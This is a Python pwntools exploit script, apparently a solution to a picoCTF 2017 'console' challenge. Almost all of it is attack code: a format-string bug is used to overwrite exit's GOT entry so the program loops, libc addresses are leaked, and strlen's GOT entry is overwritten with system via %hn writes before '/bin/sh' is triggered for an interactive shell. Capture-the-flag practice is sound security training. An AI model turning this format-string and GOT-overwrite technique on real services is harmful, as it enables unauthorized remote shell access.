#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='console'

if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59994
else:
    elf=ELF(binaire)
    libc=ELF('libc-chall.so.6')
    host='shell2017.picoctf.com'
    port=42132

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)


############


def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=p.recvuntil("Password: ")
    return(b[0:8])


def lireptroffset(i):
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    b=p.recvuntil("Password: ")
    return(b[:b.index(" is incorrect")])


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=p.recvuntil("Password: ")
    fin=b.index(" is incorrect")
    return(b[4:fin])

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)


p=remote(host,port)
chaineretour='      e %2493x%17$hnAAAA'+p64(elf.got['exit'])

# il y a une faille format au niveau de la commande e

#1) ok on fait boucler le programme: exit ---> loop
b=p.recvuntil("action: ")
p.sendline(chaineretour)
b=p.recvuntil("action: ")
print "[+] bouclage fait"

#2) la libc
reference_libc='printf'
chaine='      e %17$s   xxxxxxxx'+p64(elf.got[reference_libc])
#print chaine
p.sendline(chaine)
b=p.recvuntil("action: ")
b=b[b.index("set!")+5:]
b=b[0:6]+"\x00"*2
adr_reference_libc=bword(b)
print '[+] '+reference_libc+' = ',hex(adr_reference_libc)


reference_libc='fgets'
chaine='      e %17$s   xxxxxxxx'+p64(elf.got[reference_libc])
#print chaine
p.sendline(chaine)
b=p.recvuntil("action: ")
b=b[b.index("set!")+5:]
b=b[0:6]+"\x00"*2
adr_reference_libc=bword(b)
print '[+] '+reference_libc+' = ',hex(adr_reference_libc)

reference_libc='puts'
chaine='      e %17$s   xxxxxxxx'+p64(elf.got[reference_libc])
#print chaine
p.sendline(chaine)
b=p.recvuntil("action: ")
b=b[b.index("set!")+5:]
b=b[0:6]+"\x00"*2
adr_reference_libc=bword(b)
print '[+] '+reference_libc+' = ',hex(adr_reference_libc)

reference_libc='strtok'
chaine='      e %17$s   xxxxxxxx'+p64(elf.got[reference_libc])
#print chaine
p.sendline(chaine)
b=p.recvuntil("action: ")
b=b[b.index("set!")+5:]
b=b[0:6]+"\x00"*2
adr_reference_libc=bword(b)
print '[+] '+reference_libc+' = ',hex(adr_reference_libc)

system=tolibc('system')
print '[+] system = ',hex(system)

#3) on fait agir strlen pour que la got soit mise

p.sendline('p glop')
p.recvuntil("action: ")

#3) on remplace strlen

chaine='      e '+lchaine([system & 0xffff],15,8)+p64(elf.got['strlen'])
p.sendline(chaine)
b=p.recvuntil("action: ")
chaine='      e '+lchaine([(system >>16) & 0xffff],15,8)+p64(elf.got['strlen']+2)
p.sendline(chaine)
b=p.recvuntil("action: ")

#4) on déclenche

chaine='p /bin/sh'
p.sendline(chaine)
p.interactive()
p.close()
